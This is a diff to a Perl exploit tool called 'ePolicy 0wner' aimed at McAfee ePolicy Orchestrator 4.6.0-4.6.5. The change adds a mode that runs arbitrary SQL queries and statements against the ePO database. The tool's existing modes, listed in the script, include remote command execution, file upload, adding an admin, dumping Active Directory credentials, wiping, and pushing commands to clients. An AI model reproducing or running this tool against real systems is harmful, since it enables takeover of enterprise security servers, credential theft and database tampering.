@@ -1,6 +1,6 @@
 #!/usr/bin/perl 
 #=====================================================================================================
-#**                                   ~= ePolicy 0wner v0.1 =~                                      **
+#**                                   ~= ePolicy 0wner v0.2 =~                                      **
 #**                                                                                                 **
 #**            McAfee ePolicy Orchestrator (version 4.6.0 -> 4.6.5)  -  A sexy exploit              **
 #**                                                                                                 **
@@ -33,7 +33,7 @@ my $epo = Epowner::Epo->new;
 sub print_banner {
 	print << 'EOF';
 ***********************************************************************************
-**                         ~= ePolicy 0wner v0.1 =~                              **
+**                         ~= ePolicy 0wner v0.2 =~                              **
 **                                                                               **
 ** McAfee ePolicy Orchestrator (version 4.6.0 -> 4.6.5)  -  A sexy exploit       **
 **                                                                               **
@@ -117,9 +117,13 @@ my $option_server_console_port  = 8443;
 my $option_agent_hostname  = 0;
 my $option_agent_ip     = 0;
 
+my $option_sql 		= 0;
+my $option_sql_select 	= 0;
+my $option_sql_generic 	= 0;
+
 
 my $get_options_result= GetOptions (   
-		"test" => \$option_test, 
+		"test" 			=> \$option_test, 
 		"cli-deploy|d"		=> \$option_client_deploy,
 		"targets|t=s"		=> \$option_targets,
 		"file|f=s"		=> \$option_file,
@@ -166,6 +170,10 @@ my $get_options_result= GetOptions (
                 "server-console-port=i"      => \$option_server_console_port,
                 "agent-hostname|ah=s"   => \$option_agent_hostname,
                 "agent-ip|ai=s"         => \$option_agent_ip,
+		
+		"sql"   		=> \$option_sql,
+		"select=s" 		=> \$option_sql_select,
+		"generic=s" 		=> \$option_sql_generic,
 );
 
 
@@ -207,7 +215,8 @@ my $sum =  	$option_register +
 		$option_server_upload +
 		$option_install_path +
 		$option_wipe +
-		$option_domain_creds;
+		$option_domain_creds +
+		$option_sql;
 if($sum eq 0){
         $epo->print_err( "[-] ERROR: No mode has been chosen\n");
         exit;
@@ -229,14 +238,14 @@ if($option_register) 		{ $epo->print_info("[*] MODE: NEW AGENT REGISTRATION\n\n"
 if($option_unregister) 		{ $epo->print_info("[*] MODE: UNREGISTER\n\n"); }
 if($option_check)    		{ $epo->print_info("[*] MODE: VULNERABILITY CHECK\n\n"); }
 if($option_addadmin) 		{ $epo->print_info("[*] MODE: ADD ADMIN INTO DATABASE\n\n"); }
-if($option_server_exec) 	{ $epo->print_info("[*] MODE: SERVER: CMD EXEC\n\n"); }
-if($option_server_upload) 	{ $epo->print_info("[*] MODE: SERVER: FILE UPLOAD\n\n"); }
+if($option_server_exec) 	{ $epo->print_info("[*] MODE: SERVER - CMD EXEC\n\n"); }
+if($option_server_upload) 	{ $epo->print_info("[*] MODE: SERVER - FILE UPLOAD\n\n"); }
 if($option_readdb)		{ $epo->print_info("[*] MODE: READ DATABASE\n\n"); }
 if($option_domain_creds)	{ $epo->print_info("[*] MODE: GET ACTIVE DIRECTORY CREDENTIALS\n\n"); }
 if($option_wipe)		{ $epo->print_info("[*] MODE: WIPE\n\n"); }
 if($option_install_path)	{ $epo->print_info("[*] MODE: GET INSTALLATION PATH\n\n"); }
 if($option_client_deploy)	{ $epo->print_info("[*] MODE: PRODUCTS/COMMANDS DEPLOYMENT ON CLIENT(S)\n\n"); }
-
+if($option_sql)                 { $epo->print_info("[*] MODE: EXECUTE CUSTOM SQL QUERY\n\n");}
 
 
 #=====================
@@ -341,6 +350,29 @@ if($option_register){
 	$epo->mode_check();
 }
 
+
+
+#====================================================================
+# MANUAL SQL QUERY
+#====================================================================
+if($option_sql){
+        if($option_sql_select eq 0 and $option_sql_generic eq 0){
+                $epo->print_err("[-] ERROR: sub option is missing. Please use '--select' or '--generic'\n");
+                exit;
+        }
+	if($option_sql_select ne 0 and $option_sql_generic ne 0 ){
+		$epo->print_err("[-] ERROR: Only one sub option can be used with '--sql' mode.\n");
+		exit;
+	}
+
+	# select-like
+	if($option_sql_select){
+		$epo->mode_sql_query_with_results($option_sql_select);
+        }else{
+		$epo->mode_sql_query_without_results($option_sql_generic);
+	}
+	save_exit();
+}
 
 
 #====================================================================
@@ -772,6 +804,23 @@ Description: Retrieve the installation pathes of ePo software
 Synopsis
 
    $0 --get-install-path
+
+
+============================
+= MODE: --sql              =
+============================
+
+Description: Execute your own SQL queries on the ePO database
+
+Synopsis:
+
+   $0 --sql --select <statement>
+   $0 --sql --generic <statement>
+
+Parameters:
+
+  --select <arg>        SELECT-like statement with output from the database.
+  --generic <arg>       Any other SQL statements without output (ex: INSERT, UPDATE, ...)
 
 
 ============================
